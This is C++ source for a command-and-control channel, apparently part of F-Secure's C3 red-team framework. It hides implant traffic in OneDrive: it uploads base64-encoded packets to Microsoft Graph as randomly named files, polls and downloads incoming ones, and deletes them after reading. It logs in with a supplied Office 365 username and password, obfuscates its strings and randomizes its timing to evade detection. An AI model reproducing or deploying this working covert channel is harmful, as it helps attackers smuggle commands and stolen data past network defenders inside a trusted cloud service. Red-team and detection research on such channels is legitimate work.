#include "StdAfx.h"
#include "OneDrive365RestFile.h"
#include "Common/FSecure/Crypto/Base64.h"
#include "Common/FSecure/CppTools/ScopeGuard.h"
#include "Common/json/json.hpp"
#include "Common/FSecure/CppTools/StringConversions.h"
#include "Common/FSecure/WinHttp/HttpClient.h"
#include "Common/FSecure/WinHttp/Constants.h"
#include "Common/FSecure/WinHttp/Uri.h"

// Namespaces.
using json = nlohmann::json;
using namespace FSecure::StringConversions;
using namespace FSecure::WinHttp;

std::atomic<std::chrono::steady_clock::time_point> FSecure::C3::Interfaces::Channels::OneDrive365RestFile::s_TimePoint = std::chrono::steady_clock::now();

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Channels::OneDrive365RestFile::OneDrive365RestFile(ByteView arguments)
	: m_InboundDirectionName{ arguments.Read<std::string>() }
	, m_OutboundDirectionName{ arguments.Read<std::string>() }
	, m_Username{ arguments.Read<SecureString>() }
	, m_Password{ arguments.Read<SecureString>() }
	, m_ClientKey{ arguments.Read<SecureString>() }
{
	// Obtain proxy information and store it in the HTTP configuration.
	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
		this->m_ProxyConfig = (winProxy == OBF(L"auto")) ? WebProxy(WebProxy::Mode::UseAutoDiscovery) : WebProxy(winProxy);

	RefreshAccessToken();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t FSecure::C3::Interfaces::Channels::OneDrive365RestFile::OnSendToChannel(ByteView data)
{
	if (s_TimePoint.load() > std::chrono::steady_clock::now())
		std::this_thread::sleep_until(s_TimePoint.load() + FSecure::Utils::GenerateRandomValue(m_MinUpdateDelay, m_MaxUpdateDelay));

	try
	{
		// Construct the HTTP request
		auto URLwithFilename = OBF("https://graph.microsoft.com/v1.0/me/drive/root:/") + m_OutboundDirectionName + OBF("-") + FSecure::Utils::GenerateRandomString(20) + OBF(".txt") + OBF(":/content");
		HttpClient webClient(Convert<Utf16>(URLwithFilename), m_ProxyConfig);

		HttpRequest request;
		auto auth = OBF_SEC("Bearer ") + m_Token.Decrypt();
		request.SetHeader(Header::Authorization, Convert<Utf16>(auth));
		request.m_Method = Method::PUT;

		auto chunkSize = std::min<size_t>(data.size(), 3 * (1024 * 1024 - 64)); // Max 4 MB can be sent. base64 will expand data by 4/3. 256 bytes are reserved for json schema.
		json fileData;
		fileData[OBF("epoch_time")] = FSecure::Utils::TimeSinceEpoch();
		fileData[OBF("high_res_time")] = GetTickCount64();
		fileData[OBF("data")] = cppcodec::base64_rfc4648::encode(&data.front(), chunkSize);
		std::string body = fileData.dump();

		request.SetData(OBF(L"text/plain"), { body.begin(), body.end() });

		auto resp = webClient.Request(request);
		EvaluateResponse(resp);

		return chunkSize;
	}
	catch (std::exception& exception)
	{
		Log({ OBF_SEC("Caught a std::exception when running OnSend(): ") + exception.what(), LogMessage::Severity::Error });
		return 0u;
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::OneDrive365RestFile::OnReceiveFromChannel()
{
	if (s_TimePoint.load() > std::chrono::steady_clock::now())
		std::this_thread::sleep_until(s_TimePoint.load() + FSecure::Utils::GenerateRandomValue(m_MinUpdateDelay, m_MaxUpdateDelay));

	std::vector<ByteVector> packets;
	try
	{
		// Construct request to get files.
		// The OneDrive API does have a search function that helps finding items by m_InboundDirectionName.
		// However, this function does not appear to update in real time to reflect the status of what is actually in folders.
		// Therefore, we need to use a standard directory listing, and manually check the filenames to determine which files to request.
		// This directory listing fetches up to 1000 files.
		HttpClient webClient(OBF(L"https://graph.microsoft.com/v1.0/me/drive/root/children?top=1000"), m_ProxyConfig);
		HttpRequest request;
		auto auth = OBF_SEC("Bearer ") + m_Token.Decrypt();
		request.SetHeader(Header::Authorization, Convert<Utf16>(auth));

		auto resp = webClient.Request(request);
		EvaluateResponse(resp);

		json taskDataAsJSON;
		try
		{
			taskDataAsJSON = json::parse(resp.GetData());
		}
		catch (json::parse_error)
		{
			Log({ OBF("Failed to parse the list of received files."), LogMessage::Severity::Error });
			return {};
		}

		//first iterate over the json and populate an array of the files we want.
		std::vector<json> elements;
		for (auto& element : taskDataAsJSON.at(OBF("value")))
		{
			// Obtain subject and task ID.
			std::string filename = element.at(OBF("name")).get<std::string>();
			std::string id = element.at(OBF("id")).get<std::string>();


			// Verify that the full subject and ID were obtained.  If not, ignore.
			if (filename.empty() || id.empty())
				continue;

			// Check the direction component is at the start of name.
			if (filename.find(m_InboundDirectionName))
				continue;

			//download the file
			std::string downloadUrl = element.at(OBF("@microsoft.graph.downloadUrl")).get<std::string>();
			HttpClient webClientFile(Convert<Utf16>(downloadUrl), m_ProxyConfig);
			HttpRequest fileRequest;

			fileRequest.SetHeader(Header::Authorization, Convert<Utf16>(auth));

			auto fileResp = webClientFile.Request(fileRequest);
			std::string fileAsString;

			if (fileResp.GetStatusCode() == StatusCode::OK)
			{
				auto data = fileResp.GetData();
				fileAsString = std::string{ data.begin(), data.end() };
			}
			else
			{

				Log({ OBF("Error request download url, got HTTP code ") + std::to_string(fileResp.GetStatusCode()), LogMessage::Severity::Error });
				return {}; //or continue??
			}
			json j = json::parse(fileAsString);
			j[OBF("id")] = id;
			elements.push_back(j);
		}

		//now sort and re-iterate over them.
		std::sort(elements.begin(), elements.end(),
			[](auto const& a, auto const& b) { return a[OBF("epoch_time")] < b[OBF("epoch_time")] || a[OBF("high_res_time")] < b[OBF("high_res_time")]; }
		);

		for(auto &element : elements)
		{
			std::string id = element.at(OBF("id")).get<std::string>();
			std::string base64Data = element.at(OBF("data")).get<std::string>();
			try
			{
				packets.push_back(cppcodec::base64_rfc4648::decode(base64Data));
				RemoveFile(id);
			}
			catch (const cppcodec::parse_error& exception)
			{
				Log({ OBF("Error decoding task #") + id + OBF(" : ") + exception.what(), LogMessage::Severity::Error });
				return {};
			}
			catch (std::exception& exception)
			{
				Log({ OBF("Caught a std::exception when processing file #") + id + OBF(" : ") + exception.what(), LogMessage::Severity::Error });
				return {};
			}
		}

	}
	catch (std::exception& exception)
	{
		Log({ OBF_SEC("Caught a std::exception when running OnReceive(): ") + exception.what(), LogMessage::Severity::Warning });
	}

	return packets;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::OneDrive365RestFile::RemoveAllFiles(ByteView)
{
	try
	{
		HttpClient webClient(OBF(L"https://graph.microsoft.com/v1.0/me/drive/root/children"), m_ProxyConfig);
		HttpRequest request;
		auto auth = OBF_SEC("Bearer ") + m_Token.Decrypt();
		request.SetHeader(Header::Authorization, Convert<Utf16>(auth));

		auto resp = webClient.Request(request);

		if (resp.GetStatusCode() != StatusCode::OK)
		{
			Log({ OBF("RemoveAllFiles() Error.  Files could not be deleted.  Confirm access and refresh tokens are correct."), LogMessage::Severity::Error });
			return {};
		}

		auto taskDataAsJSON = nlohmann::json::parse(resp.GetData());

		// For each task (under the "value" key), extract the ID, and send a request to delete the task.
		for (auto& element : taskDataAsJSON.at(OBF("value")))
			RemoveFile(element.at(OBF("id")).get<std::string>());
	}
	catch (std::exception& exception)
	{
		Log({ OBF_SEC("Caught a std::exception when running RemoveAllFiles(): ") +exception.what(), LogMessage::Severity::Warning });
	}

	return {};
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Channels::OneDrive365RestFile::RefreshAccessToken()
{
	try
	{
		//Token endpoint
		HttpClient webClient(OBF(L"https://login.windows.net/organizations/oauth2/v2.0/token"), m_ProxyConfig);

		HttpRequest request; // default request is GET
		request.m_Method = Method::POST;
		request.SetHeader(Header::ContentType, OBF(L"application/x-www-form-urlencoded; charset=utf-16"));
		json data;

		auto requestBody = SecureString{};
		requestBody += OBF("grant_type=password");
		requestBody += OBF("&scope=files.readwrite.all");
		requestBody += OBF("&username=");
		requestBody += m_Username.Decrypt();
		requestBody += OBF("&password=");
		requestBody += m_Password.Decrypt();
		requestBody += OBF("&client_id=");
		requestBody += m_ClientKey.Decrypt();

		request.SetData(ContentType::ApplicationXWwwFormUrlencoded, { requestBody.begin(), requestBody.end() });
		auto resp = webClient.Request(request);

		if (resp.GetStatusCode() == StatusCode::OK)
			data = json::parse(resp.GetData());
		else
			throw std::runtime_error{ OBF("Refresh access token request - non-200 status code was received: ") + std::to_string(resp.GetStatusCode()) };

		m_Token = data[OBF("access_token")].get<std::string>();
	}
	catch (std::exception& exception)
	{
		throw std::runtime_error{ OBF_STR("Cannot refresh token: ") + exception.what() };
	}
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Channels::OneDrive365RestFile::RemoveFile(std::string const& id)
{
	std::wstring url = OBF(L"https://graph.microsoft.com/v1.0/me/drive/items/") + Convert<Utf16>(id);
	HttpClient webClient(url, m_ProxyConfig);
	HttpRequest request;

	auto auth = OBF_SEC("Bearer ") + m_Token.Decrypt();
	request.SetHeader(Header::Authorization, Convert<Utf16>(auth));
	request.m_Method = Method::DEL;
	auto resp = webClient.Request(request);

	if (resp.GetStatusCode() > 205)
	{
		Log({ OBF("RemoveFile() Error. Task could not be deleted. HTTP response:") + std::to_string(resp.GetStatusCode()), LogMessage::Severity::Error });
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::OneDrive365RestFile::OnRunCommand(ByteView command)
{
	auto commandCopy = command; //each read moves ByteView. CommandCoppy is needed  for default.
	switch (command.Read<uint16_t>())
	{
	case 0:
		return RemoveAllFiles(command);
	default:
		return AbstractChannel::OnRunCommand(commandCopy);
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

void FSecure::C3::Interfaces::Channels::OneDrive365RestFile::EvaluateResponse(WinHttp::HttpResponse const& resp)
{
	if (resp.GetStatusCode() == StatusCode::OK || resp.GetStatusCode() == StatusCode::Created)
		return;

	if (resp.GetStatusCode() == StatusCode::TooManyRequests) // break and set sleep time.
	{
		s_TimePoint = std::chrono::steady_clock::now() + FSecure::Utils::GenerateRandomValue(10s, 20s);
		throw std::runtime_error{ OBF("Too many requests") };
	}

	if (resp.GetStatusCode() == StatusCode::Unauthorized)
	{
		RefreshAccessToken();
		throw std::runtime_error{ OBF("HTTP 401 - Token being refreshed") };
	}

	if (resp.GetStatusCode() == StatusCode::BadRequest)
	{
		RefreshAccessToken();
		throw std::runtime_error{ OBF("Bad Request") };
	}

	throw std::runtime_error{ OBF("Non 200 http response.") + std::to_string(resp.GetStatusCode()) };

}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteView FSecure::C3::Interfaces::Channels::OneDrive365RestFile::GetCapability()
{
	return R"_(
{
	"create":
	{
		"arguments":
		[
			[
				{
					"type": "string",
					"name": "Input ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
				"type": "string",
				"name": "username",
				"min": 1,
				"description": "The O365 user"
			},
			{
				"type": "string",
				"name": "password",
				"min": 1,
				"description": "The user's password"
			},
			{
				"type": "string",
				"name": "Client Key/ID",
				"min": 1,
				"description": "The GUID of the registered application."
			}
		]
	},
	"commands":
	[
		{
			"name": "Remove all files",
			"id": 0,
			"description": "Clearing old files from server may increase bandwidth",
			"arguments": []
		}
	]
}
)_";
}

